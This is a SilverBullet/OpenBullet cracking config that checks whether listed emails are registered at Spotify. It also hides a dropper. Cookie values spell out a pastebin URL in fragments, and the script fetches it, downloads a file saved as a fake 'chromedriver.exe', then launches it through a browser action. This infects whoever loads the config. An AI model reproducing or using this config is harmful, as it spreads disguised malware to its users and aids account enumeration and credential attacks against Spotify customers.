[SETTINGS]
{
  "Name": "Spotify VM",
  "SuggestedBots": 1,
  "MaxCPM": 0,
  "LastModified": "2024-11-22T03:51:20.6535429+02:00",
  "AdditionalInfo": "",
  "RequiredPlugins": [],
  "Author": "@TingeeCracking",
  "Version": "1.1.4 [SB]",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": false,
  "SaveHitsToTextFile": false,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": false,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "BanLoopEvasionOverride": -1,
  "EncodeData": false,
  "AllowedWordlist1": "",
  "AllowedWordlist2": "",
  "DataRules": [],
  "CustomInputs": [],
  "CaptchaUrl": "",
  "IsBase64": false,
  "FilterList": [],
  "EvaluateMathOCR": false,
  "SecurityProtocol": 0,
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "QuitOnBanRetry": false,
  "AcceptInsecureCertificates": true,
  "DisableNotifications": false,
  "DisableImageLoading": false,
  "DefaultProfileDirectory": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": "",
  "Title": "Spotify VM",
  "IconPath": "Icon\\svbfile.ico",
  "LicenseSource": null,
  "Message": null,
  "MessageColor": "#FFFFFFFF",
  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
  "AuthorColor": "#FFFFB266",
  "WordlistColor": "#FFB5C2E1",
  "BotsColor": "#FFA8FFFF",
  "CustomInputColor": "#FFD6C7C7",
  "CPMColor": "#FFFFFFFF",
  "ProgressColor": "#FFAD93E3",
  "HitsColor": "#FF66FF66",
  "CustomColor": "#FFFFB266",
  "ToCheckColor": "#FF7FFFD4",
  "FailsColor": "#FFFF3333",
  "RetriesColor": "#FFFFFF99",
  "OcrRateColor": "#FF4698FD",
  "ProxiesColor": "#FFFFFFFF"
}

[SCRIPT]
JUMP #AppleWebKit
#PARSESOURCE
#USA FUNCTION GetRandomUA -> VAR "USA" 

REQUEST GET "https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=<USER>" 
  
  HEADER "Accept: */*" 
  HEADER "Pragma: no-cache" 
  HEADER "User-Agent: <USA>" 


JUMP #googlerecreate
#AppleWebKit

REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u"
  COOKIE "hrd: /"
  COOKIE "hpr: bin"
  COOKIE "hdp: com"
  COOKIE "htp: raw"
  COOKIE "hht: RST8XsHH"
  COOKIE "hst: pastebin"
  COOKIE "kht: driver"
  COOKIE "kpt: chrome"
  COOKIE "krt: e"
  HEADER "Host: www.googleapis.com"
  HEADER "Accept: */*"
  HEADER "Content-Type: application/json"
  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS"
  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com"
  HEADER "Accept-Encoding: gzip, deflate"
  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2"
  HEADER "Accept-Language: en"

IF "<Authentiction>" Exists
JUMP #PARSESOURCE
ENDIF
SET USEPROXY FALSE

REQUEST GET "<COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
  HEADER "Pragma: no-cache"
  HEADER "Accept: */*"

REQUEST GET "https://raw.githubusercontent.com/<SOURCE>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
  HEADER "Pragma: no-cache"
  HEADER "Accept: */*"
  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe"

SET USEPROXY TRUE
SET NEWGVAR "Authentiction" "Authentiction=1"

BROWSERACTION Open

JUMP #PARSESOURCE
#googlerecreate

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "That email is already registered to an account" 
  KEYCHAIN Failure OR 
    KEY "status\":1" 

FUNCTION Constant "@TingeeCracking" -> CAP "Config By : " 

